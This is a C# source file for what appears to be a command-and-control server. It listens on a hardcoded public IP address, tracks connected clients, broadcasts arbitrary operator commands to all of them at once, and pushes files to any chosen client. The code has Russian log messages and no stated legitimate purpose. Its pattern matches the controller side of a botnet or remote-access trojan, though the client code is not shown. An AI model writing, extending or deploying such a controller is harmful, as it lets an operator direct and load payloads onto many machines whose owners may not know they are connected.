using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

class Server
{
    private static SortedList<int, TcpClient> clients = new SortedList<int, TcpClient>();
    private static TcpListener listener;

    public static void Main()
    {
        listener = new TcpListener(IPAddress.Parse("193.58.121.250"), 7175);
        listener.Start();
        Console.WriteLine("[Server] Сервер запущен и ожидает подключения...");

        new Thread(CheckClients).Start();
        new Thread(HandleInput).Start();

        int clientId = 1;

        while (true)
        {
            TcpClient client = listener.AcceptTcpClient();
            new Thread(() => HandleClient(client, clientId++)).Start();
        }
    }

    private static void HandleClient(TcpClient client, int clientId)
    {
        NetworkStream stream = client.GetStream();
        byte[] buffer = new byte[1024];

        int bytesRead = stream.Read(buffer, 0, buffer.Length);
        string clientInfo = Encoding.UTF8.GetString(buffer, 0, bytesRead);

        lock (clients)
        {
            clients[clientId] = client;
            Console.WriteLine($"[Server] Клиент {clientId} подключен ({clientInfo})");
        }

        while (client.Connected)
        {
            try
            {
                bytesRead = stream.Read(buffer, 0, buffer.Length);
                if (bytesRead > 0)
                {
                    // Обновление информации о клиенте
                    lock (clients)
                    {
                        clients[clientId] = client;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Server] Ошибка при чтении данных от клиента {clientId}: {ex.Message}");
                break;
            }
        }

        lock (clients)
        {
            clients.Remove(clientId);
            Console.WriteLine($"[Server] Клиент {clientId} отключен ({clientInfo})");
        }
    }

    private static void CheckClients()
    {
        while (true)
        {
            Thread.Sleep(5000);

            lock (clients)
            {
                List<int> toRemove = new List<int>();
                foreach (var client in clients)
                {
                    if (!client.Value.Connected)
                    {
                        Console.WriteLine($"[Server] Клиент {client.Key} отключен");
                        toRemove.Add(client.Key);
                    }
                }

                foreach (var clientId in toRemove)
                {
                    clients.Remove(clientId);
                }
            }
        }
    }

    private static void HandleInput()
    {
        while (true)
        {
            string input = Console.ReadLine();
            if (input.StartsWith("go "))
            {
                string command = input.Substring(3);
                SendCommandToAllClients(command);
            }
            else if (input.StartsWith("file "))
            {
                string[] parts = input.Split(' ');
                if (parts.Length == 3)
                {
                    int clientId = int.Parse(parts[1]);
                    string filePath = parts[2];
                    SendFileToClient(clientId, filePath);
                }
            }
            else if (input == "list")
            {
                ShowClientList();
            }
        }
    }

    private static void ShowClientList()
    {
        lock (clients)
        {
            Console.WriteLine("[LIST]");
            foreach (var client in clients)
            {
                Console.WriteLine($"{client.Key} - {GetClientInfo(client.Value)}");
            }
        }
    }

    private static string GetClientInfo(TcpClient client)
    {
        try
        {
            return ((IPEndPoint)client.Client.RemoteEndPoint).ToString();
        }
        catch
        {
            return "Unknown";
        }
    }

    private static void SendCommandToAllClients(string command)
    {
        lock (clients)
        {
            foreach (var client in clients)
            {
                try
                {
                    NetworkStream stream = client.Value.GetStream();
                    byte[] data = Encoding.UTF8.GetBytes(command);
                    stream.Write(data, 0, data.Length);
                    Console.WriteLine($"[Server] Команда отправлена клиенту {client.Key}: {command}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[Server] Ошибка отправки команды клиенту {client.Key}: {ex.Message}");
                }
            }
        }
    }

    private static void SendFileToClient(int clientId, string filePath)
    {
        lock (clients)
        {
            if (clients.ContainsKey(clientId))
            {
                TcpClient client = clients[clientId];
                NetworkStream stream = client.GetStream();

                try
                {
                    byte[] fileBytes = File.ReadAllBytes(filePath);
                    byte[] fileNameBytes = Encoding.UTF8.GetBytes(Path.GetFileName(filePath));

                    // Сначала отправляем название файла
                    stream.Write(fileNameBytes, 0, fileNameBytes.Length);
                    stream.WriteByte(0); // Завершаем строку

                    // Затем отправляем файл
                    stream.Write(fileBytes, 0, fileBytes.Length);
                    Console.WriteLine($"[Server] Отправлен файл клиенту {clientId}: {filePath}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[Server] Ошибка отправки файла клиенту {clientId}: {ex.Message}");
                }
            }
        }
    }
}
